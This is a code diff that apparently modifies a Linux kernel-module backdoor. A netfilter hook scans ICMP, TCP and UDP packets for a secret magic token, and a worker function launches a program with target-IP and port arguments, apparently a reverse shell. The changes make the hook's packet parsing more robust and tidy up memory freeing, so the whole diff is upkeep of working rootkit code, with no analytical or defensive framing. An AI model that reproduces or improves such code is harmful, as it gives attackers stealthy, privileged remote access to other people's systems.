@@ -127,12 +127,7 @@ void shell_execer(struct work_struct *work) {
     	char *argv[] = { task->path, "-t", task->ip, "-p", task->port, NULL };
 
     	exec(argv);
-    	if(task) {
-		//bzero(task->path, strlen(task->path));	
-		//bzero(task->ip, strlen(task->ip));	
-		//bzero(task->port, strlen(task->port));	
-		kfree(task);
-	}
+    	if(task) kfree(task);
 }
 
 int shell_exec_queue(char *path, char *ip, char *port) {
@@ -256,11 +251,17 @@ void decode_n_spawn(char *data) {
 unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *socket_buffer, 
 			       const struct net_device *in, const struct net_device *out, 
 			       int (*okfn)(struct sk_buff *)) {
-    	struct iphdr   *ip_header;
-    	struct icmphdr *icmp_header;
-    	struct tcphdr  *tcp_header;
-    	struct udphdr  *udp_header;
-    	char *data, token[] = TOKEN;
+    	
+	const struct iphdr   *ip_header;
+    	const struct icmphdr *icmp_header;
+    	const struct tcphdr  *tcp_header;
+    	const struct udphdr  *udp_header;
+	struct iphdr	_iph;
+    	struct icmphdr	_icmph;
+	struct tcphdr	_tcph;
+	struct udphdr	_udph;
+	const char *data;
+	char *_dt, token[] = TOKEN;
     	int tsize;
 
     	data = NULL;
@@ -269,17 +270,17 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *so
 
     	if (!socket_buffer) return NF_ACCEPT;
 
-    	ip_header = ip_hdr(socket_buffer);
+    	ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);
 
     	if (!ip_header) return NF_ACCEPT;
     	if (!ip_header->protocol) return NF_ACCEPT;
 
      	if (ip_header->protocol == IPPROTO_ICMP) {
-        	icmp_header = (struct icmphdr *)((__u32 *)ip_header + ip_header->ihl);
+        	icmp_header = skb_header_pointer(socket_buffer, ip_header->ihl*4, sizeof(_icmph), &_icmph);
 
         	if (!icmp_header) return NF_ACCEPT;
 
-        	data = (char *)((unsigned char *)icmp_header + sizeof(struct icmphdr));
+        	data = skb_header_pointer(socket_buffer, ip_header->ihl*4 + sizeof(struct icmphdr), sizeof(_dt), &_dt);
 
     		if (!data) return NF_ACCEPT;
 
@@ -290,11 +291,11 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *so
     	}
      
      	if (ip_header->protocol == IPPROTO_TCP) {
-        	tcp_header = (struct tcphdr *)((__u32 *)ip_header + ip_header->ihl);
+        	tcp_header = skb_header_pointer(socket_buffer, ip_header->ihl*4, sizeof(_tcph), &_tcph);
 
         	if (!tcp_header) return NF_ACCEPT;
 
-        	data = (char *)((unsigned char *)tcp_header + sizeof(struct tcphdr));
+        	data = skb_header_pointer(socket_buffer, ip_header->ihl*4 + sizeof(struct tcphdr), sizeof(_dt), &_dt);
     		
 		if (!data) return NF_ACCEPT;
 
@@ -305,11 +306,11 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *so
     	}
      
      	if (ip_header->protocol == IPPROTO_UDP) {
-        	udp_header = (struct udphdr *)((__u32 *)ip_header + ip_header->ihl);
+        	udp_header = skb_header_pointer(socket_buffer, ip_header->ihl*4, sizeof(_udph), &_udph);
 
         	if (!udp_header) return NF_ACCEPT;
 
-        	data = (char *)((unsigned char *)udp_header + sizeof(struct udphdr));
+        	data = skb_header_pointer(socket_buffer, ip_header->ihl*4 + sizeof(struct udphdr), sizeof(_dt), &_dt);
     		
 		if (!data) return NF_ACCEPT;
 
